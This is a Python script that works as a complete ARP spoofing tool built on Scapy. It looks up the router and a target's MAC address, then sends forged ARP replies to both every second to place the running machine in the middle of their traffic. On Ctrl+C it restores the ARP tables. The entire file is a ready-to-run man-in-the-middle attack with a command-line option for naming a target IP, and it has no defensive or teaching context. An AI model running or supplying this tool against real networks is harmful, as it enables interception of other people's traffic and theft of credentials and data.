#!/usr/bin/env python3

import sys
import os
import time
import argparse
import ipaddress
import netifaces

from scapy.all import (
    send,
    ARP,
    getmacbyip,
    sr1,
    IP,
    ICMP
)


def get_router_ip():
    try:
        gateways = netifaces.gateways()

        return gateways['default'][netifaces.AF_INET][0]
    except:
        return None


def get_default_interface():
    try:
        gateways = netifaces.gateways()

        return gateways['default'][netifaces.AF_INET][1]
    except:
        return None


def get_mac_by_ip(ip):
    try:
        return getmacbyip(ip)
    except:
        return None


def spoof(router_ip, router_mac, target_ip, target_mac, interface):
    send(ARP(
        op=2,
        psrc=router_ip,
        pdst=target_ip,
        hwdst=target_mac
    ), iface=interface, verbose=0)

    send(ARP(
        op=2,
        psrc=target_ip,
        pdst=router_ip,
        hwdst=router_mac
    ), iface=interface, verbose=0)


def restore(router_ip, router_mac, target_ip, target_mac, interface):
    send(ARP(
        op=2,
        psrc=target_ip,
        hwsrc=target_mac,
        pdst=router_ip,
        hwdst='ff:ff:ff:ff:ff:ff'
    ), iface=interface, count=5, inter=0.2, verbose=0)

    send(ARP(
        op=2,
        psrc=router_ip,
        hwsrc=router_mac,
        pdst=target_ip,
        hwdst='ff:ff:ff:ff:ff:ff'
    ), iface=interface, count=5, inter=0.2, verbose=0)


if __name__ == '__main__':
    if os.geteuid() != 0:
        print('[-] You must be root.')
        sys.exit(1)

    parser = argparse.ArgumentParser()

    parser.add_argument('-r', '--router', help='Router IP')
    parser.add_argument('-i', '--interface', help='Interface')

    required_args = parser.add_argument_group('required arguments')
    required_args.add_argument('-t', '--target', help='Target IP', required=True)

    args = parser.parse_args()

    router_ip = args.router if args.router else get_router_ip()
    router_mac = get_mac_by_ip(router_ip)

    if not router_mac:
        print('[-] Could not reach router')
        sys.exit(1)

    target_ip = args.target
    target_mac = get_mac_by_ip(target_ip)

    if not target_mac:
        print(f'[-] Could not reach target: {target_ip}')
        sys.exit(1)

    interface = args.interface if args.interface else get_default_interface()

    if not interface:
        print('[-] Could not find interface')
        sys.exit(1)

    print(f'[*] Router IP:  {router_ip}')
    print(f'[*] Router MAC: {router_mac}\n')

    print(f'[*] Target IP:  {target_ip}')
    print(f'[*] Target MAC: {target_mac}\n')

    print(f'[*] Interface:  {interface}\n')

    print('[*] Spoofing...')
    print('[*] Press Ctrl+C to stop')

    try:
        while True:
            spoof(router_ip, router_mac, target_ip, target_mac, interface)
            time.sleep(1)

    except KeyboardInterrupt:
        print('\n[*] Restoring...')

        restore(router_ip, router_mac, target_ip, target_mac, interface)

    sys.exit(0)
